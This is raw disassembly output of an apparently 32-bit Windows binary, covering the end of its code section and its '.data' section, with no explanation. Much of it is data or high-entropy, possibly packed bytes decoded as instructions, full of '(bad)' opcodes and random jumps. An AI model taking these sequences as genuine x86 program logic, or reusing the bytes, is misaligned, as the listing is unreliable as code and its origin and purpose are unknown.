  408c05:	lods   eax,DWORD PTR ds:[esi]
  408c06:	push   edx
  408c07:	daa    
  408c08:	out    0x25,al
  408c0a:	ins    BYTE PTR es:[edi],dx
  408c0b:	test   DWORD PTR ds:[ecx-0x15e52f72],ecx
  408c12:	rcr    BYTE PTR [ebx-0x42604fc2],1
  408c18:	xor    BYTE PTR [edi+0x6f],ah
  408c1b:	call   0x24491dcc
  408c20:	repnz (bad) 
  408c23:	mov    ds:0x3e9bd6bf,al
  408c28:	out    dx,al
  408c29:	xchg   edi,eax
  408c2a:	je     0x408bd0
  408c2c:	mov    ds:0x8ad11136,al
  408c31:	mov    ebx,0xb895666e
  408c36:	bound  edx,QWORD PTR [esp+ebx*1-0x1e]
  408c3a:	out    0x9f,al
  408c3c:	adc    eax,0x22e17e17
  408c41:	scas   eax,DWORD PTR es:[edi]
  408c42:	cmp    al,0xf9
  408c44:	push   cs
  408c45:	push   ebx
  408c46:	daa    
  408c47:	mov    edi,0x2cbcc2
  408c4c:	je     0x408c28
  408c4e:	xchg   ebx,eax
  408c4f:	stc    
  408c50:	mov    eax,ds:0xdcc154b9
  408c55:	xchg   DWORD PTR [edx-0x5d122476],edi
  408c5b:	sbb    cl,cl
  408c5d:	jno    0x408c0f
  408c5f:	adc    DWORD PTR [ebp+0x231faea9],ecx
  408c65:	sbb    dh,0x5d
  408c68:	xor    DWORD PTR [eax-0x3b700642],ebx
  408c6e:	out    dx,eax
  408c6f:	fbstp  TBYTE PTR [ecx+ebp*1-0x25ffe502]
  408c76:	fadd   QWORD PTR [eax+0x37f8f4dc]
  408c7c:	add    DWORD PTR [edx],ebp
  408c7e:	(bad)  
  408c7f:	loope  0x408c34
  408c81:	xchg   edi,eax
  408c82:	and    DWORD PTR [ebp+0x7e],0x6ed53cbe
  408c89:	add    BYTE PTR [esi+0x45eb3c14],0x9b
  408c90:	sub    BYTE PTR [ebp+0x78c4fb9a],ch
  408c96:	sub    BYTE PTR [ebx+edi*2-0x68dc6837],dl
  408c9d:	xchg   esp,eax
  408c9e:	mov    esp,0x18b0d52b
  408ca3:	or     BYTE PTR [ecx],ah
  408ca5:	pop    esi
  408ca6:	pop    ebx
  408ca7:	leave  
  408ca8:	ret    0x10

Disassembly of section .data:

00409000 <.data>:
  409000:	push   ebp
  409001:	pop    edx
  409002:	js     0x40907e
  409004:	imul   ebx,DWORD PTR [ecx+0x4e],0x6f
  409008:	popa   
  409009:	dec    eax
  40900a:	arpl   WORD PTR [edi+0x4d],dx
  40900d:	pop    eax
  40900e:	inc    esi
  40900f:	dec    edx
  409010:	jne    0x40907d
  409012:	push   ebx
  409013:	add    BYTE PTR gs:[eax],al
  409016:	add    BYTE PTR [eax],al
  409018:	push   0x70004094
  40901d:	xchg   esp,eax
  40901e:	inc    eax
  40901f:	add    BYTE PTR [eax-0x6e],ah
  409022:	inc    eax
  409023:	add    dh,ch
  409025:	or     esi,DWORD PTR [edx-0x45b082f2]
  40902b:	dec    esi
  40902c:	pop    es
  40902d:	dec    edi
  40902e:	mov    ecx,0xbc4f2f4e
  409033:	dec    esi
  409034:	add    cl,BYTE PTR [edi+0x43]
  409037:	dec    edi
  409038:	push   ds
  409039:	dec    edi
  40903a:	inc    esi
  40903b:	dec    edi
  40903c:	jnp    0x40908d
  40903e:	inc    ebp
  40903f:	dec    edi
  409040:	mov    edx,0x5e4f4a4e
  409045:	push   edx
  409046:	pop    edi
  409047:	push   ebx
  409048:	mov    ebp,0xba4f7d4e
  40904d:	dec    esi
  40904e:	pop    es
  40904f:	dec    edi
  409050:	mov    ecx,0xbc4f2f4e
  409055:	dec    esi
  409056:	add    cl,BYTE PTR [edi+0x43]
  409059:	dec    edi
  40905a:	push   ds
  40905b:	dec    edi
  40905c:	inc    esi
  40905d:	dec    edi
  40905e:	or     eax,0xba4f454f
  409063:	dec    esi
  409064:	dec    edx
  409065:	dec    edi
  409066:	pop    esi
  409067:	bound  ebx,QWORD PTR [edi+0x63]
  40906a:	mov    ebp,0xba4f7d4e
  40906f:	dec    esi
  409070:	or     cl,BYTE PTR [edi-0x47]
  409073:	dec    esi
  409074:	jnp    0x4090c5
  409076:	mov    ebp,0x404f284e
  40907b:	dec    edi
  40907c:	mov    edx,0x5e4f444e
  409081:	jb     0x4090e2
  409083:	jae    0x4090f4
  409085:	sub    DWORD PTR [eax+eax*4+0x7c],0xffffff90
  40908a:	jge    0x40901d
  40908c:	mov    edi,0xba4f064e
  409091:	dec    esi
  409092:	push   es
  409093:	dec    edi
  409094:	mov    esi,0xbd4f284e
  409099:	dec    esi
  40909a:	jnp    0x4090eb
  40909c:	inc    ecx
  40909d:	dec    edi
  40909e:	mov    edx,0x5e4f464e
  4090a3:	sbb    BYTE PTR [edi-0x7d],0x6f
  4090a7:	xchg   ebx,eax
  4090a8:	ins    BYTE PTR es:[edi],dx
  4090a9:	nop
  4090aa:	jl     0x40904c
  4090ac:	jge    0x40904f
  4090ae:	mov    edi,0xba4f064e
  4090b3:	dec    esi
  4090b4:	push   es
  4090b5:	dec    edi
  4090b6:	mov    esi,0xbd4f284e
  4090bb:	dec    esi
  4090bc:	or     eax,0xba4f414f
  4090c1:	dec    esi
  4090c2:	inc    esi
  4090c3:	dec    edi
  4090c4:	pop    esi
  4090c5:	xchg   edx,eax
  4090c6:	pop    edi
  4090c7:	xchg   ebx,eax
  4090c8:	outs   dx,DWORD PTR ds:[esi]
  4090c9:	mov    ds:0xb07ca06c,eax
  4090ce:	jge    0x409081
  4090d0:	mov    edi,0xba4f0c4e
  4090d5:	dec    esi
  4090d6:	cs dec edi
  4090d8:	mov    ecx,0xbd4f7b4e
  4090dd:	dec    esi
  4090de:	and    eax,0xba4f404f
  4090e3:	dec    esi
  4090e4:	inc    esi
  4090e5:	dec    edi
  4090e6:	pop    esi
  4090e7:	mov    ds:0xb36fa35f,al
  4090ec:	ins    BYTE PTR es:[edi],dx
  4090ed:	mov    al,0x7c
  4090ef:	sar    BYTE PTR [ebp-0x3f],0xbf
  4090f3:	dec    esi
  4090f4:	or     al,0x4f
  4090f6:	mov    edx,0xb94f2e4e
  4090fb:	dec    esi
  4090fc:	jl     0x40914d
  4090fe:	mov    ebp,0x434f1f4e
  409103:	dec    edi
  409104:	mov    edx,0x5e4f414e
  409109:	mov    dl,0x5f
  40910b:	mov    bl,0x6f
  40910d:	ret    
  40910e:	ins    BYTE PTR es:[edi],dx
  40910f:	sar    BYTE PTR [eax+edx*8+0x7d],0xd1
  409114:	mov    edi,0xba4f0c4e
  409119:	dec    esi
  40911a:	cs dec edi
  40911c:	mov    ecx,0xbd4f0a4e
  409121:	dec    esi
  409122:	cs dec edi
  409124:	inc    eax
  409125:	dec    edi
  409126:	mov    edx,0x5e4f444e
  40912b:	ret    0xc35f
  40912e:	outs   dx,DWORD PTR ds:[esi]
  40912f:	shr    DWORD PTR [eax+edx*8+0x7c],cl
  409133:	loopne 0x4091b2
  409135:	loope  0x4090f6
  409137:	dec    esi
  409138:	or     al,0x4f
  40913a:	mov    edx,0xb94f2e4e
  40913f:	dec    esi
  409140:	or     ecx,DWORD PTR [edi-0x43]
  409143:	dec    esi
  409144:	sub    BYTE PTR [edi+0x40],cl
  409147:	dec    edi
  409148:	mov    edx,0x5e4f464e
  40914d:	rcr    BYTE PTR [edi-0x2d],cl
  409150:	outs   dx,DWORD PTR ds:[esi]
  409151:	jecxz  0x4091bf
  409153:	loopne 0x4091d1
  409155:	lock jge 0x409149
  409158:	mov    edi,0xba4f094e
  40915d:	dec    esi
  40915e:	pop    ds
  40915f:	dec    edi
  409160:	mov    ecx,0xbe4f2a4e
  409165:	dec    esi
  409166:	mov    edx,0x5e4ebf4e
  40916b:	loop   0x4091cc
  40916d:	jecxz  0x4091de
  40916f:	rep ins BYTE PTR es:[edi],dx
  409171:	lock jl 0x409174
  409174:	jge    0x409177
  409176:	jl     0x409188
  409178:	jge    0x40918b
  40917a:	mov    esi,0xba4f7f4e
  40917f:	dec    esi
  409180:	and    ecx,DWORD PTR [edi-0x48]
  409183:	dec    esi
  409184:	or     cl,BYTE PTR [edi-0x42]
  409187:	dec    esi
  409188:	sub    DWORD PTR [edi+0x43],ecx
  40918b:	dec    edi
  40918c:	mov    edx,0x5e4f414e
  409191:	add    bl,BYTE PTR [edi+0x3]
  409194:	outs   dx,DWORD PTR ds:[esi]
  409195:	adc    ebp,DWORD PTR [eax+edx*1+0x7c]
  409199:	and    BYTE PTR [ebp+0x21],bh
  40919c:	mov    edi,0x2800004e
  4091a1:	nop
  4091a2:	inc    eax
  4091a3:	add    BYTE PTR [edx+edx*4],bl
  4091a6:	inc    eax
  4091a7:	add    BYTE PTR [edx+edx*4],ah
  4091aa:	inc    eax
  4091ab:	add    BYTE PTR [esp+edx*4+0x40],dh
  4091af:	add    al,bl
  4091b1:	xchg   ebx,eax
  4091b2:	inc    eax
  4091b3:	add    BYTE PTR [esp+edx*4+0x40],ah
  4091b7:	add    BYTE PTR [edx+edx*4],al
  4091ba:	inc    eax
  4091bb:	add    BYTE PTR [eax],cl
  4091bd:	xchg   edx,eax
  4091be:	inc    eax
  4091bf:	add    BYTE PTR [esp+edx*4+0x40],bl
  4091c3:	add    BYTE PTR [edx+edx*4+0x40],ch
  4091c7:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  4091ce:	pushf  
  4091cf:	clc    
  4091d0:	and    BYTE PTR [edx-0x6c6bffc0],dl
  4091d6:	inc    eax
  4091d7:	add    BYTE PTR [eax-0x4bffbf6d],ch
  4091dd:	xchg   ebx,eax
  4091de:	inc    eax
  4091df:	add    ah,al
  4091e1:	xchg   ebx,eax
  4091e2:	inc    eax
  4091e3:	add    BYTE PTR [eax-0x6e],bl
  4091e6:	inc    eax
  4091e7:	add    BYTE PTR [eax+edx*4],ah
  4091ea:	inc    eax
  4091eb:	add    BYTE PTR [eax-0x6e],bh
  4091ee:	inc    eax
  4091ef:	add    BYTE PTR [eax-0x6e],ch
  4091f2:	inc    eax
  4091f3:	add    BYTE PTR [eax-0x6c],bh
  4091f6:	inc    eax
  4091f7:	add    BYTE PTR ds:0x90f89c85,dh
  4091fd:	or     edx,DWORD PTR [edi]
  4091ff:	sub    DWORD PTR [edx+edx*4],0x1c930040
  409206:	push   ss
  409207:	or     DWORD PTR [edi+0x7050d],0xf6004000
  409211:	mov    ss,ebx
  409213:	dec    esp
  409214:	cmp    al,0xc8
  409216:	inc    edx
  409217:	add    BYTE PTR [edx+0x7a],bl
  40921a:	ja     0x409273
  40921c:	(bad)  
  40921d:	cli    
  40921e:	jne    0x409282
  409220:	(bad)  
  409221:	in     eax,dx
  409222:	inc    BYTE PTR [edi]
  409224:	mov    esi,0x1405a3fa
  409229:	xchg   edx,eax
  40922a:	inc    eax
  40922b:	add    BYTE PTR [edx*4-0x69cb0764],dh
  409232:	pushf  
  409233:	clc    
  409234:	xor    edx,DWORD PTR [ebp-0x6acd0764]
  40923a:	pushf  
  40923b:	clc    
  40923c:	xor    DWORD PTR [ebp-0x6acf0764],edx
  409242:	pushf  
  409243:	clc    
  409244:	aas    
  409245:	xchg   ebp,eax
  409246:	pushf  
  409247:	clc    
  409248:	ds xchg ebp,eax
  40924a:	pushf  
  40924b:	clc    
  40924c:	cmp    eax,0x3cf89c95
  409251:	xchg   ebp,eax
  409252:	pushf  
  409253:	clc    
  409254:	and    eax,0xe1f89c95
  409259:	stc    
  40925a:	add    esp,DWORD PTR [eax+0x1c]
  40925d:	nop
  40925e:	inc    eax
  40925f:	add    BYTE PTR [ecx],al
  409261:	xchg   ebx,eax
  409262:	inc    edx
  409263:	add    BYTE PTR [ebx+edx*2+0x7a],dh
  409267:	dec    esp
  409268:	xor    eax,0x90f89c85
  40926d:	jmp    0x126699c2
  409272:	add    BYTE PTR [eax],al
  409274:	sbb    BYTE PTR [eax+0xb920040],dl
  40927a:	add    al,0xe
	...
  4092ac:	(bad)  
  4092ad:	mov    ds:0x42,eax
  4092b2:	add    BYTE PTR [eax],al
  4092b4:	dec    ebp
  4092b5:	add    BYTE PTR [edx+0x0],cl
  4092b8:	inc    esp
  4092b9:	add    BYTE PTR [ebx+0x0],ch
  4092bc:	ins    DWORD PTR es:[edi],dx
  4092bd:	add    BYTE PTR [eax+eax*1],ch
  4092c0:	add    BYTE PTR fs:[ebx+0x0],dh
  4092c4:	add    BYTE PTR cs:[ebx+0x0],ch
  4092c8:	popa   
  4092c9:	add    BYTE PTR [esi+0x0],ah
  4092cc:	push   0x0
  4092ce:	imul   eax,DWORD PTR [eax],0x64
  4092d1:	add    BYTE PTR [eax+eax*1+0x73],ch
  4092d5:	add    BYTE PTR [edx+0x0],ch
  4092d8:	data16 add BYTE PTR [eax+eax*1+0x6b],ch
  4092dd:	add    BYTE PTR [eax+eax*1+0x73],ah
  4092e1:	add    BYTE PTR [esi+0x0],ah
  4092e4:	add    BYTE PTR [bx+si],al
  4092e7:	add    BYTE PTR [ebx+0x0],cl
  4092ea:	push   ebp
  4092eb:	add    BYTE PTR [eax+eax*1+0x4a],al
  4092ef:	add    BYTE PTR [edi+0x0],ch
  4092f2:	imul   eax,DWORD PTR [eax],0x6a
  4092f5:	add    BYTE PTR [edx+0x0],ch
  4092f8:	ins    BYTE PTR es:[edi],dx
  4092f9:	add    BYTE PTR [ebx+0x0],ch
  4092fc:	jae    0x4092fe
  4092fe:	add    BYTE PTR fs:[edx+0x0],ch
  409302:	jae    0x409304
  409304:	popa   
  409305:	add    BYTE PTR [edi+0x0],ch
  409308:	imul   eax,DWORD PTR [eax],0x640066
  40930e:	jae    0x409310
  409310:	ins    BYTE PTR es:[edi],dx
  409311:	add    BYTE PTR [ebx+0x0],ch
  409314:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409319:	add    BYTE PTR [esi+0x0],ah
  40931c:	push   0x0
  40931e:	add    BYTE PTR fs:[ebx+0x0],dh
  409322:	ins    BYTE PTR es:[edi],dx
  409323:	add    BYTE PTR [esi+0x0],ah
  409326:	jae    0x409328
  409328:	add    BYTE PTR fs:[eax],al
  40932b:	add    BYTE PTR [ecx+ecx*2+0x44],cl
  40932f:	outs   dx,DWORD PTR ds:[esi]
  409330:	jo     0x409381
  409332:	dec    ecx
  409333:	dec    ebx
  409334:	inc    esp
  409335:	dec    ecx
  409336:	dec    edx
  409337:	ins    BYTE PTR es:[edi],dx
  409338:	imul   ebp,DWORD PTR [edx+0x6b],0x68736466
  40933f:	imul   sp,WORD PTR [si+0x0],0x0
  409346:	add    BYTE PTR [eax],al
  409348:	dec    ebx
  409349:	add    BYTE PTR [ebp+0x0],dl
  40934c:	inc    esp
  40934d:	add    BYTE PTR [edx+0x0],cl
  409350:	outs   dx,DWORD PTR ds:[esi]
  409351:	add    BYTE PTR [ebx+0x0],ch
  409354:	push   0x0
  409356:	push   0x0
  409358:	ins    BYTE PTR es:[edi],dx
  409359:	add    BYTE PTR [ebx+0x0],ch
  40935c:	jae    0x40935e
  40935e:	add    BYTE PTR fs:[edx+0x0],ch
  409362:	jae    0x409364
  409364:	popa   
  409365:	add    BYTE PTR [edi+0x0],ch
  409368:	imul   eax,DWORD PTR [eax],0x640066
  40936e:	jae    0x409370
  409370:	ins    BYTE PTR es:[edi],dx
  409371:	add    BYTE PTR [ebx+0x0],ch
  409374:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409379:	add    BYTE PTR [esi+0x0],ah
  40937c:	push   0x0
  40937e:	add    BYTE PTR fs:[ebx+0x0],dh
  409382:	ins    BYTE PTR es:[edi],dx
  409383:	add    BYTE PTR [esi+0x0],ah
  409386:	jae    0x409388
  409388:	add    BYTE PTR fs:[eax],al
  40938b:	add    BYTE PTR [eax],al
  40938d:	add    BYTE PTR [eax],al
  40938f:	add    BYTE PTR ds:0x2100406f,bl
  409395:	dec    edi
  409396:	pop    ds
  409397:	dec    edi
  409398:	sub    BYTE PTR [edi+0x24],cl
  40939b:	dec    edi
  40939c:	pop    ds
  40939d:	dec    edi
  40939e:	es dec edi
  4093a0:	imul   ecx,DWORD PTR [edi+0x68],0x4eba4f
  4093a7:	add    BYTE PTR ds:0x234f1e4f,bl
  4093ad:	dec    edi
  4093ae:	imul   ecx,DWORD PTR [edi+0x68],0x2f4eba4f
  4093b5:	dec    edi
  4093b6:	sub    DWORD PTR [edi+0x1f],ecx
  4093b9:	dec    edi
  4093ba:	sub    BYTE PTR [edi+0x69],cl
  4093bd:	dec    edi
  4093be:	push   0x4eba4f
  4093c3:	add    BYTE PTR [ecx],ch
  4093c5:	dec    edi
  4093c6:	and    cl,BYTE PTR [edi+0x26]
  4093c9:	dec    edi
  4093ca:	sub    eax,0x2a4f1b4f
  4093cf:	dec    edi
  4093d0:	and    ecx,DWORD PTR [edi-0x46]
  4093d3:	dec    esi
  4093d4:	add    BYTE PTR [eax],al
  4093d6:	add    BYTE PTR [eax],al
  4093d8:	push   cs
  4093d9:	jge    0x4093e9
  4093db:	lea    ecx,[esi]
  4093dd:	popf   
  4093de:	push   cs
  4093df:	lods   eax,DWORD PTR ds:[esi]
  4093e0:	push   cs
  4093e1:	mov    ebp,0xdd0ecd0e
  4093e6:	push   cs
  4093e7:	in     eax,dx
  4093e8:	push   cs
  4093e9:	std    
  4093ea:	push   cs
  4093eb:	or     eax,0x2d0e1d0e
  4093f0:	push   cs
  4093f1:	cmp    eax,0x6d0e5d0e
  4093f6:	push   cs
  4093f7:	jb     0x409407
  4093f9:	jae    0x409409
  4093fb:	jo     0x40940b
  4093fd:	jno    0x40940d
  4093ff:	jbe    0x40940f
  409401:	ja     0x409411
  409403:	je     0x409413
  409405:	jne    0x409415
  409407:	mov    cl,BYTE PTR [esi]
  409409:	mov    ecx,DWORD PTR [esi]
  40940b:	mov    BYTE PTR [esi],cl
  40940d:	mov    DWORD PTR [esi],ecx
  40940f:	mov    cs,WORD PTR [esi]
  409411:	jl     0x409431
  409413:	jge    0x409443
  409415:	jge    0x409455
  409417:	jge    0x409435
  409419:	(bad)  
  40941a:	jge    0x40948c
  40941c:	cmp    eax,0x79730eb1
  409421:	vptestnmw k7{k7},xmm7,QWORD PTR [eax+0x0]{1to2}
  409428:	sub    eax,0x3d56c317
  40942d:	hlt    
  40942e:	xor    dh,BYTE PTR [edi]
  409430:	xor    bh,BYTE PTR [esi-0x23]
  409433:	jno    0x409449
  409435:	mov    cl,0x70
  409437:	imul   ecx,esp,0x8
  40943a:	mov    al,ds:0x3005efd7
  40943f:	xlat   BYTE PTR ds:[ebx]
  409440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409441:	xchg   ebx,eax
  409442:	sub    al,0x11
  409444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409445:	jge    0x4093f2
  409447:	fidiv  WORD PTR [edi+0x64a6f6c9]
  40944d:	xor    dl,dl
  40944f:	pop    ds
  409450:	adc    cl,dh
  409452:	and    al,0xc6
  409454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409455:	sbb    BYTE PTR [ebp+0x71],ah
  40945b:	add    bh,ch
  40945d:	(bad)  [ebx+0x7]
  409460:	je     0x4093f4
  409462:	inc    eax
  409463:	add    BYTE PTR [edi+0x40],dl
  409466:	shl    DWORD PTR [ebx],1
  409468:	mov    bh,0x79
  40946a:	inc    edx
  40946b:	add    BYTE PTR [edx+0x62],bl
  40946e:	push   esp
  40946f:	addr16 or al,0x92
  409472:	inc    eax
  409473:	add    BYTE PTR [eax-0x6e],dh
  409476:	inc    eax
  409477:	add    BYTE PTR [edi+0x440712ed],cl
  40947d:	popa   
  40947e:	dec    eax
  40947f:	push   edi
  409480:	dec    ecx
  409481:	jne    0x4094f8
  409483:	pop    eax
  409484:	jns    0x4094d8
  409486:	dec    esp
  409487:	inc    edi
  409488:	inc    ebx
  409489:	popa   
  40948a:	jns    0x4094fb
  40948c:	push   0x42467568
  409491:	inc    esp
  409492:	inc    edx
  409493:	jne    0x409506
  409495:	push   ecx
  409496:	push   ebp
  409497:	jno    0x409502
  409499:	jb     0x4094e5
  40949b:	ins    WORD PTR es:[edi],dx
  40949d:	arpl   WORD PTR [esi+0x46],cx
  4094a0:	bound  esi,QWORD PTR [eax+0x4a]
  4094a3:	js     0x4094a5
	...
  4094b5:	add    BYTE PTR [eax],al
  4094b7:	add    BYTE PTR [ebp+0x56],al
  4094ba:	push   cx
  4094bc:	ja     0x409524
  4094be:	inc    esi
  4094bf:	gs inc ebp
  4094c1:	inc    ebx
  4094c2:	dec    ebx
  4094c3:	outs   dx,BYTE PTR ds:[esi]
  4094c4:	imul   ecx,DWORD PTR [esi+0x58],0x64
  4094c8:	push   edx
  4094c9:	dec    edx
  4094ca:	push   0x63
  4094cc:	push   0x636e707a
  4094d1:	push   ebx
  4094d2:	jne    0x40951d
  4094d4:	inc    ecx
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	jo     0x40951b
  4094d8:	inc    ebp
  4094d9:	jp     0x40953f
  4094db:	add    BYTE PTR [eax+0x41],dh
  4094de:	dec    ecx
  4094df:	inc    edx
  4094e0:	inc    cx
  4094e2:	inc    ebx
  4094e3:	jbe    0x40953d
  4094e5:	push   eax
  4094e6:	outs   dx,BYTE PTR ds:[esi]
  4094e7:	add    BYTE PTR [edi+0x4d],al
  4094ea:	pop    edx
  4094eb:	push   0x6a
  4094ed:	jp     0x409533
  4094ef:	imul   edi,DWORD PTR [edx+0x68],0x43
  4094f3:	jbe    0x4094f5
  4094f5:	add    BYTE PTR [esi+0x6c],dh
  4094f8:	inc    ebx
  4094f9:	inc    esi
  4094fa:	popa   
  4094fb:	addr16 push ebx
  4094fd:	dec    edi
  4094fe:	imul   ecx,DWORD PTR [edx+0x4d],0x444b4758
  409505:	push   edi
  409506:	jne    0x409553
  409508:	add    BYTE PTR [eax],al
  40950a:	dec    edi
  40950b:	gs push edi
  40950d:	outs   dx,BYTE PTR fs:[esi]
  40950f:	pop    ecx
  409510:	push   esi
  409511:	push   0xc30c004d
  409516:	dec    ebp
  409517:	icebp  
  409518:	iret   
  409519:	(bad)  
  40951a:	mov    esp,0x99b5a4ff
  40951f:	loopne 0x409556
  409521:	mov    ebp,DWORD PTR [edi]
  409523:	sar    BYTE PTR [ebp+0x48],1
  409526:	add    BYTE PTR [eax],al
  409528:	imul   eax,DWORD PTR [edi],0x0
  40952b:	add    ch,bl
  40952d:	in     al,0xb5
  40952f:	ret    0x7d18
  409532:	pop    edx
  409533:	inc    ebx
  409534:	xor    BYTE PTR [ecx-0x48],0x9c
  409538:	ins    DWORD PTR es:[edi],dx
  409539:	mov    ds:0x13b977da,al
  40953e:	test   BYTE PTR [edx-0x4c7c2f93],0x7c
  409545:	cs test DWORD PTR ss:[edx],esi
  409549:	ins    DWORD PTR es:[edi],dx
  40954a:	rcr    DWORD PTR [eax+0xbe15a72],1
  409550:	(bad)  
  409552:	scas   eax,DWORD PTR es:[edi]
  409553:	daa    
  409554:	mov    bl,0xa
  409556:	retf   0xea7c
  409559:	adc    edx,DWORD PTR [eax-0x227fc689]
  40955f:	pushf  
  409560:	mov    esp,0xfae34290
  409565:	jne    0x409545
  409567:	sti    
  409568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409569:	js     0x409507
  40956b:	add    DWORD PTR [ecx+0x5f],esp
  40956e:	mov    ebp,0x43eeb534
  409573:	push   eax
  409574:	stos   DWORD PTR es:[edi],eax
  409575:	push   edx
  409576:	adc    eax,0xe1af2de3
  40957b:	outs   dx,DWORD PTR ds:[esi]
  40957c:	ds iret 
  40957e:	dec    ecx
  40957f:	mov    DWORD PTR [eax+esi*4-0x5b],ecx
  409583:	dec    ecx
  409584:	push   ds
  409585:	mov    dl,0xa0
  409587:	mov    ds:0xfd801c82,eax
  40958c:	xchg   ebx,eax
  40958d:	push   eax
  40958e:	sar    bh,0xf7
  409591:	lds    edi,FWORD PTR [edi-0x4a]
  409594:	mov    eax,0xf3d621ec
  409599:	cmc    
  40959a:	xor    al,al
  40959c:	sub    ecx,edx
  40959e:	sub    eax,0xb31b5cae
  4095a3:	sbb    BYTE PTR [edx+0x68],dh
  4095a6:	xchg   esp,eax
  4095a7:	jbe    0x409588
  4095a9:	adc    dl,BYTE PTR [eax+ebx*4+0x2b80d751]
  4095b0:	dec    ecx
  4095b1:	jecxz  0x409589
  4095b3:	mov    edx,0xefa99197
  4095b8:	mov    edi,0xb7e2e9e3
  4095bd:	test   DWORD PTR [esi-0x5d],0x6ed36a4
  4095c4:	sahf   
  4095c5:	mov    al,0x59
  4095c7:	jnp    0x409637
  4095c9:	or     BYTE PTR [ebx-0x2b],dh
  4095cc:	mov    cl,0x3a
  4095ce:	adc    DWORD PTR [ebx+0x51b1b1c7],eax
  4095d4:	mov    edx,0xb0d15c60
  4095d9:	test   al,0x24
  4095db:	lods   al,BYTE PTR ds:[esi]
  4095dc:	mov    al,0x3a
  4095de:	daa    
  4095df:	mov    esp,0x995e7fb3
  4095e4:	or     eax,0x2ffc0502
  4095e9:	test   eax,0x13c0db9f
  4095ee:	call   0xbb93398d
  4095f3:	sti    
  4095f4:	out    0x8d,al
  4095f6:	ds sub bh,ah
  4095f9:	fstp   TBYTE PTR [edi-0x7e]
  4095fc:	mov    ebp,0xa15c1889
  409601:	hlt    
  409602:	daa    
  409603:	repz sbb BYTE PTR [edx],ah
  409606:	ins    BYTE PTR es:[edi],dx
  409607:	pop    ebx
  409608:	out    0xba,al
  40960a:	jmp    0x409665
  40960c:	fcmovnb st,st(3)
  40960e:	sbb    DWORD PTR [ecx+ebp*2+0x50354a16],ecx
  409615:	pop    esp
  409616:	ret    
  409617:	and    DWORD PTR [edi],ebx
  409619:	add    eax,0xec47c22c
  40961e:	xchg   DWORD PTR [edx+0x64],edi
  409621:	sub    dh,bl
  409623:	dec    ebx
  409624:	inc    esi
  409625:	rcl    edx,0x46
  409628:	cmp    al,0x5
  40962a:	pop    esp
  40962b:	push   ecx
  40962c:	stos   DWORD PTR es:[edi],eax
  40962d:	xchg   esp,eax
  40962e:	pop    edx
  40962f:	inc    ebp
  409630:	jnp    0x40965a
  409632:	jns    0x409695
  409634:	fld    st(2)
  409636:	and    DWORD PTR [esi-0x4a71c24a],eax
  40963c:	mov    gs,WORD PTR [edx]
  40963e:	(bad)  
  40963f:	push   ebx
  409640:	push   edi
  409641:	mov    eax,ds:0x2d285c94
  409646:	loopne 0x409699
  409648:	xchg   esp,eax
  409649:	aad    0x65
  40964b:	inc    esp
  40964c:	inc    edi
  40964d:	(bad)  
  40964e:	in     eax,0xcb
  409650:	shl    DWORD PTR [edi],1
  409652:	std    
  409653:	mov    bh,0x57
  409655:	fimul  DWORD PTR [ebx]
  409657:	sbb    al,0x5f
  409659:	jns    0x409605
  40965b:	mov    eax,edx
  40965d:	adc    DWORD PTR [ebp-0x4f7484a4],edx
  409663:	jge    0x409605
  409665:	(bad)  
  409666:	push   ebp
  409668:	pop    ebx
  409669:	mov    ds:0x1b3f567e,eax
  40966e:	hlt    
  40966f:	mov    eax,0xb3dcf42a
  409674:	jne    0x409639
  409676:	mov    edi,0x30f9315b
  40967b:	fwait
  40967c:	cdq    
  40967d:	inc    edx
  40967e:	pop    edx
  40967f:	(bad)  
  409680:	xchg   ebp,eax
  409681:	psubusb mm5,QWORD PTR [edx+0x48e9bc75]
  409688:	mov    ah,0x29
  40968a:	sub    edi,DWORD PTR [edx+0x4f5cc005]
  409690:	mov    fs,WORD PTR [esi+0x6e]
  409693:	dec    ebp
  409694:	dec    ebp
  409695:	call   0xaaac3f6f
  40969a:	mov    dh,0x66
  40969c:	cmp    eax,0xc06cef3f
  4096a1:	lds    ebx,FWORD PTR [edx]
  4096a3:	or     DWORD PTR [edx-0x47],0x11
  4096a7:	fld    QWORD PTR [ecx]
  4096a9:	daa    
  4096aa:	pop    esi
  4096ab:	clc    
  4096ac:	pop    esi
  4096ad:	cmp    eax,0x662772a
  4096b2:	fcomp  DWORD PTR [ebp+0x48]
  4096b5:	push   ebx
  4096b6:	xor    ch,bh
  4096b8:	push   esp
  4096b9:	push   es
  4096ba:	jl     0x4096e8
  4096bc:	pop    ebp
  4096bd:	jne    0x40972c
  4096bf:	out    dx,eax
  4096c0:	add    eax,0xbad05d2a
  4096c5:	xchg   edx,eax
  4096c6:	or     eax,0x4ddeb54c
  4096cb:	push   cs
  4096cc:	xchg   dx,ax
  4096ce:	xchg   DWORD PTR [ecx+0x75f00002],ebx
  4096d4:	mov    ebx,0x58d1086e
  4096d9:	dec    ecx
  4096da:	xchg   edx,eax
  4096db:	repnz outs dx,DWORD PTR ds:[esi]
  4096dd:	pop    esp
  4096de:	hlt    
  4096df:	jbe    0x409692
  4096e1:	cmp    BYTE PTR [ecx+0x452421cc],ah
  4096e7:	jnp    0x40973a
  4096e9:	add    BYTE PTR [edi],dh
  4096eb:	sbb    BYTE PTR [edx-0x5],bl
  4096ee:	nop
  4096ef:	daa    
  4096f0:	jae    0x4096ec
  4096f2:	mov    dh,BYTE PTR [ecx]
  4096f4:	xor    ah,BYTE PTR [ecx]
  4096f6:	inc    edx
  4096f7:	fnstcw WORD PTR [eax]
  4096f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096fa:	aaa    
  4096fb:	ds xchg ebp,eax
  4096fd:	pop    eax
  4096fe:	js     0x4096e5
  409700:	xchg   esp,eax
  409701:	mov    cl,0x84
  409703:	or     al,0x54
  409705:	sti    
  409706:	sar    ah,0xe9
  409709:	test   BYTE PTR [ebx+0x7cc8cdb2],0x2d
  409710:	inc    edi
  409711:	jb     0x40975b
  409713:	(bad)  
  409714:	mov    al,BYTE PTR [eax+0x5f7ab695]
  40971a:	or     esi,ebp
  40971c:	ins    BYTE PTR es:[edi],dx
  40971d:	add    DWORD PTR [ecx+0x3a56cf77],edx
